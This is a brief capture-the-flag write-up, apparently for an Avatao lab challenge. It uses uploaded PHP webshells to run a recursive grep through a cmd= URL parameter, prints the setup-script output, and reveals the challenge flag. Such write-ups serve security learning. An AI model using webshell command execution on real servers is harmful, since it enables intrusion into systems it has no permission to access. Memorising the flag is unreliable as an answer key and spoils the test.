## Method

Our user does not have sufficient priviledges to access the location `/root/root.txt`, so we need to execute priviledge escalation or to find a reference to that file somewhere else (for instance, a script that generated that file).

By use of one of the these webshells ([simple-backdoor.php](simple-backdoor.php), [rome.php](rome.php) or [bash.php](bash.php)) we search recursively through file contents for the string `root.txt`.

A successfull command is:
```https://6b5c2d7659c636b2b7649090795f7894477126e1.next.avatao-challenge.com/img/user.php?cmd=cd%20/tmp;%20grep%20-r%20%22root.txt%22```
and it returns the following data:
```
skripte/conf.sh:echo "FLAG{DZIVI:7283456896-ROOT}" > /root/root.txt
skripte/conf.sh:chown root:root /root/root.txt
skripte/conf.sh:chmod go-rwx /root/root.txt
```

Therefore, the flag is `FLAG{DZIVI:7283456896-ROOT}`.